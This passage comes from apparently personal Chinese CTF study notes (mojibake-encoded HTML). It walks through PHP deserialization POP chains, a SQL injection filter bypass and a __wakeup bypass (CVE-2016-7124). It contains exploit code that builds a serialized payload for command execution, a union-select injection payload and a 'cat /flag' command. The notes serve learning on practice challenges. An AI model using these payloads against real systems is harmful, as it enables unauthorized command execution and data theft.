é­”æœ¯æ–¹æ³•ï¼šå½“å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br><br>        <span class="hljs-comment">// é­”æœ¯æ–¹æ³•ï¼šå½“è®¿é—®ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å®šä¹‰futureç±»</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;  <span class="hljs-comment">// ç§æœ‰å±æ€§impossible</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;     <span class="hljs-comment">// ç§æœ‰å±æ€§out</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;      <span class="hljs-comment">// ç§æœ‰å±æ€§no</span><br>        <span class="hljs-comment">// å¤šä¸ªå…¬å…±å±æ€§</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-comment">// é­”æœ¯æ–¹æ³•ï¼šå½“ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-comment">// æ£€æŸ¥outå¯¹è±¡çš„useful7å±æ€§æ˜¯å¦å­˜åœ¨</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤whoami</span><br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// é­”æœ¯æ–¹æ³•ï¼šå½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-comment">// æ‰§è¡ŒPOSTå‚æ•°wowæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// ææ„å‡½æ•°</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥filenameå‚æ•°æŒ‡å®šçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå»æ‰filenameå‚æ•°æœ€å4ä¸ªå­—ç¬¦</span><br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-comment">// å¯¹å¤„ç†åçš„æ•°æ®è¿›è¡Œ5æ¬¡base64è§£ç åååºåˆ—åŒ–</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// æ³¨é‡Šæç¤ºï¼šä½ æ˜¨å¤©å­¦ä¹ ï¼Œä»Šå¤©é€‰æ‹©ï¼Œèƒ½åˆ°è¾¾ä½ çš„æœªæ¥å—ï¼Ÿ</span><br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç»™då¯¼è§£æäº†ä¸€ä¸‹ï¼Œæ²¡ç›´æ¥ç»™å‡ºèƒ½ç”¨çš„payloadï¼Œä½†æ˜¯æ€è·¯çœ‹äº†ä¸€ä¸‹åº”è¯¥æ²¡é—®é¢˜ï¼Œå…ˆè°ƒç”¨yesterday é‡Œçš„__destructï¼Œé‡Œé¢è°ƒç”¨äº†ä¸€ä¸ªhardæ–¹æ³•ï¼Œå¯¹åº”todayçš„_callï¼Œç„¶åæ˜¯å½“md5è°ƒç”¨ç±»æ—¶ä¼šå°†å…¶å½“æˆå­—ç¬¦ä¸²è°ƒç”¨ï¼Œå¯¹åº”futureé‡Œçš„_toStringï¼Œç„¶å_toStringé‡Œç›´ä¼ å‚wowå³å¯  </p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> yesterday;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> today;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> tommoraw;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> future;<br><br><span class="hljs-comment">// æ­£ç¡®çš„å±æ€§èµ‹å€¼æ–¹å¼</span><br><span class="hljs-variable">$a</span>-&gt;study = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;doing=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-comment">// å…ˆåºåˆ—åŒ–ï¼Œå†å¤šå±‚base64ç¼–ç </span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serialized</span>)))));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>.<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åå†posté‡Œä¼ wowæ¥è¿è¡Œå³å¯<br>wow&#x3D;cat &#x2F;flag;</p>
<hr>
<h2 id="title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf"><a href="#title-note-nssctf-01date-2025-03-17-22-01-05tags-nssctf" class="headerlink" title="title: note-nssctf-01date: 2025-03-17 22:01:05tags: nssctf"></a>title: note-nssctf-01<br>date: 2025-03-17 22:01:05<br>tags: nssctf</h2><h1 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-sql"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-sql" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_sql"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_sql</h1><p>é¢˜ç›®è¯´å‚æ•°ä¸ºnssï¼Œgetä¼ nss&#x3D;1<br>æç¤ºè¦ç”¨æ›´å®‰å…¨çš„ä¼ å‚æ³•ï¼Œé‚£å°±postäº†<br>post:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //æŠ¥é”™</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //æˆåŠŸé—­åˆ</span><br></code></pre></td></tr></table></figure>
<p>ç”¨è”åˆæ³¨å…¥å‘ç°è¢«è¿‡æ»¤äº†unionï¼Œç©ºæ ¼<br>åŒå†™ç»•è¿‡å³å¯<br>çˆ†å­—æ®µpayload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p>åˆ°è¿™æ­¥å°±å·®ä¸å¤šäº†</p>
<hr>
<h2 id="title-note-ååºåˆ—åŒ–-00date-2025-03-18-22-36-05tags"><a href="#title-note-ååºåˆ—åŒ–-00date-2025-03-18-22-36-05tags" class="headerlink" title="title: note-ååºåˆ—åŒ–-00date: 2025-03-18 22:36:05tags: "></a>title: note-ååºåˆ—åŒ–-00<br>date: 2025-03-18 22:36:05<br>tags: </h2><h1 id="javaååºåˆ—åŒ–notice"><a href="#javaååºåˆ—åŒ–notice" class="headerlink" title="javaååºåˆ—åŒ–notice"></a>javaååºåˆ—åŒ–notice</h1><p>ç°åœ¨ç†è§£çš„ååºåˆ—å¤§æ¦‚å°±æ˜¯ä¼ å…¥ä¸€ä¸²å­—ç¬¦ï¼Œç»javaçš„å¤„ç†å˜æˆèƒ½æ‰§è¡Œçš„è¯­å¥ï¼Œå®ç°rec  </p>
<blockquote>
<p>åºåˆ—åŒ–æŒ‡çš„æ˜¯å°†å¯¹è±¡æˆ–æ•°æ®ç»“æ„è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„æ ¼å¼çš„è¿‡ç¨‹ï¼Œå®ç°çš„æ–¹æ³•æ˜¯writeObject()ï¼›ååºåˆ—åŒ–åˆ™åä¹‹ï¼Œå®ç°çš„æ–¹æ³•æ˜¯readObject()ï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸ºå°†æ–‡ä»¶å‹ç¼©å’Œè§£å‹ç¼©çš„è¿‡ç¨‹ã€‚</p>
</blockquote>
<blockquote>
<p>ä¸PHPä¸­ååºåˆ—äº’ç›¸è§¦å‘é­”æ³•å‡½æ•°å¯¼è‡´çš„æ¼æ´æˆå› ä¸åŒï¼Œjavaååºåˆ—åŒ–æ¼æ´çš„æˆå› ä¸»è¦æ˜¯ç”±äºjavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶çš„è®¾è®¡ç‰¹ç‚¹æ‰€è‡´ï¼Œç®€å•åœ°è®²ï¼Œåªè¦ååºåˆ—åŒ–ä»£ç ä¸­å«æœ‰å±é™©çš„å‘½ä»¤ä»£ç ï¼Œä¸”è¯¥ä»£ç çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œé‚£å®ƒå°±å­˜åœ¨è¯¥æ¼æ´ã€‚</p>
</blockquote>
<blockquote>
<p>æ¼æ´åŸç†åœ¨æˆ‘ä»Šå¤©è¿™é‡Œä¸æ˜¯é‡è¦çš„ï¼Œæˆ‘ä¸»è¦æƒ³è®°å½•çš„æ˜¯è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ã€‚</p>
</blockquote>
<blockquote>
<p>é€šå¸¸åœ¨è§£é¢˜ä¸­å¦‚æœä½ çœ‹åˆ°ä¸€æ®µå­—ç¬¦ä¸²ä»¥rO0ABå¼€å¤´ï¼Œé‚£å®ƒæ˜¯javaåºåˆ—åŒ–åbase64ç¼–ç çš„æ•°æ®ï¼›å¦‚æœä¸€æ®µå­—ç¬¦ä¸²ä»¥acedå¼€å¤´ï¼Œé‚£å®ƒæ˜¯javaåºåˆ—åŒ–ååå…­è¿›åˆ¶çš„æ•°æ®ï¼Œç¢°åˆ°è¿™ä¸¤ç§æƒ…å†µéƒ½åŸºæœ¬å¯ä»¥è®¤å®šè¯¥é¢˜è€ƒç‚¹ä¸ºjavaååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚æœæœ‰ç›´æ¥æ¥å—è¯¥å­—ç¬¦ä¸²çš„è¾“å…¥ç‚¹ï¼Œå°±å¯ä»¥å°è¯•ç”¨é“¾å­ç›´æ¥æ‰“ã€‚</p>
</blockquote>
<blockquote>
<p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64893612/article/details/136378608">https://blog.csdn.net/m0_64893612/article/details/136378608</a></p>
</blockquote>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-no-wakeup-å­¦ä¹ ç¬”è®°ï¼š"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-no-wakeup-å­¦ä¹ ç¬”è®°ï¼š" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup å­¦ä¹ ç¬”è®°ï¼š"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup å­¦ä¹ ç¬”è®°ï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br>```  <br>  <br></code></pre></td></tr></table></figure>


<p>å¤§æ¦‚æ˜¯getä¸€ä¸ªpå‚æ•°ï¼Œä¼ ç»™$Letmeseeseeç„¶åååºåˆ—åŒ–ï¼Œå¯èƒ½pç»è¿‡ååºåˆ—åŒ–åä¼šå˜æˆä¸€ä¸ªåä¸ºthisçš„å˜é‡ï¼Œé‡Œé¢åŒ…å«æœ‰{admin,passwd},å…¶ä¸­passwdç»è¿‡sha1è®¡ç®—å†èµ‹å€¼ç»™åŸæ¥çš„passwdï¼Œå½“thisé‡Œçš„admin&#x3D;&#x3D;&#x3D;adminï¼Œç»è¿‡sha1è®¡ç®—çš„passwd&#x3D;&#x3D;&#x3D;wllmæ—¶å°±ä¼šè¾“å‡ºflag</p>
<p>KIMIï¼š</p>
<blockquote>
<p>ä½ çš„å®¡è®¡æ€è·¯åŸºæœ¬æ­£ç¡®ï¼Œä½†æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ¾„æ¸…ï¼š<br>ååºåˆ—åŒ–åçš„å¯¹è±¡çŠ¶æ€ï¼š<br>å½“ç”¨æˆ·ä¼ å…¥çš„på‚æ•°è¢«ååºåˆ—åŒ–åï¼Œå¦‚æœå®ƒæ˜¯ä¸€ä¸ªHaHaHaç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆ__wakeup()æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œæ­¤æ—¶$passwdçš„å€¼ä¼šè¢«æ›´æ–°ä¸ºsha1($passwd)ã€‚<br>å› æ­¤ï¼Œ$passwdçš„å€¼åœ¨ååºåˆ—åŒ–åä¼šè¢«å“ˆå¸Œå¤„ç†ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ä¼ å…¥çš„å€¼ã€‚<br>æ¡ä»¶åˆ¤æ–­ï¼š<br>åœ¨ææ„æ–¹æ³•ä¸­ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯$admin &#x3D;&#x3D;&#x3D; â€œadminâ€ä¸”$passwd &#x3D;&#x3D;&#x3D; â€œwllmâ€ã€‚<br>å› æ­¤ï¼Œæ”»å‡»è€…éœ€è¦æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œä½¿å¾—ååºåˆ—åŒ–å$adminä¸ºâ€adminâ€ï¼Œå¹¶ä¸”$passwdåœ¨ç»è¿‡sha1()å“ˆå¸Œåç­‰äºâ€wllmâ€ã€‚  </p>
</blockquote>
<p>ç„¶è€Œæ€ä¹ˆå¯èƒ½ä¼šæœ‰åœ¨ç»è¿‡sha1å¤„ç†åçš„åˆ°wllmçš„å€¼ã€‚<br>æ‰€ä»¥è¦ç»•è¿‡è¿™ä¸ª__wakeup()</p>
<p><strong>__wakeup() çš„ä½œç”¨</strong><br>ååºåˆ—åŒ–æ—¶çš„åˆå§‹åŒ–ï¼š<br>å½“ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå…¶çŠ¶æ€ä¼šè¢«ä¿å­˜ä¸ºå­—ç¬¦ä¸²ã€‚åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¯¹è±¡çš„çŠ¶æ€ä¼šè¢«æ¢å¤ï¼Œä½†æŸäº›èµ„æºï¼ˆå¦‚æ•°æ®åº“è¿æ¥ï¼‰å¯èƒ½æ— æ³•ç›´æ¥åºåˆ—åŒ–ï¼Œå› æ­¤éœ€è¦åœ¨ååºåˆ—åŒ–åé‡æ–°åˆå§‹åŒ–è¿™äº›èµ„æºã€‚<br>__wakeup() æ–¹æ³•æ­£æ˜¯ä¸ºæ­¤è®¾è®¡çš„ï¼Œå®ƒå…è®¸ä½ åœ¨å¯¹è±¡æ¢å¤åæ‰§è¡Œä¸€äº›å¿…è¦çš„æ“ä½œã€‚<br>æ•°æ®å¤„ç†ï¼š<br>åœ¨ååºåˆ—åŒ–åï¼Œä½ å¯èƒ½éœ€è¦å¯¹å¯¹è±¡çš„æŸäº›å±æ€§è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¯¹æ•æ„Ÿæ•°æ®è¿›è¡Œè§£å¯†ï¼Œæˆ–è€…å¯¹æŸäº›å±æ€§è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚</p>
<p>æ‰€ä»¥å¤§æ¦‚å°±æ˜¯å½“è§¦å‘ååºåˆ—åŒ–æ—¶__wakeupå°±ä¼šè°ƒç”¨è¿™ä¸ªsha1.</p>
<p>ç½‘ä¸Šæ­£ç¡®çš„payloadï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>å­¦ä¹ noticeï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆObjectï¼‰ã€‚  <br><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç±»åä¸ºHaHaHaçš„å¯¹è±¡ï¼Œç±»åé•¿åº¦ä¸º<span class="hljs-number">6</span>ã€‚  <br><span class="hljs-attribute">3</span>ï¼šè¡¨ç¤ºå¯¹è±¡æœ‰<span class="hljs-number">3</span>ä¸ªå±æ€§ã€‚  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;ï¼šç¬¬ä¸€ä¸ªå±æ€§åä¸ºadminï¼Œå€¼ä¸ºadminã€‚  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;ï¼šç¬¬äºŒä¸ªå±æ€§åä¸ºpasswdï¼Œå€¼ä¸ºwllmã€‚  <br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªpayloadèƒ½å¤Ÿç»•è¿‡__wakeup()æ–¹æ³•çš„åŸå› å¯èƒ½ä¸PHPååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„ä¸€äº›ç‰¹æ€§æˆ–æ¼æ´æœ‰å…³ï¼Œæ¯”å¦‚å±æ€§ä¸ªæ•°ä¸åŒ¹é…ï¼ˆCVE-2016-7124ï¼‰ã€‚<br>åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œå¦‚æœåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å±æ€§ä¸ªæ•°æ¯”å®é™…ç±»ä¸­å®šä¹‰çš„å±æ€§ä¸ªæ•°å¤šï¼ŒPHPåœ¨ååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šç»•è¿‡__wakeup()æ–¹æ³•çš„æ‰§è¡Œã€‚</p>
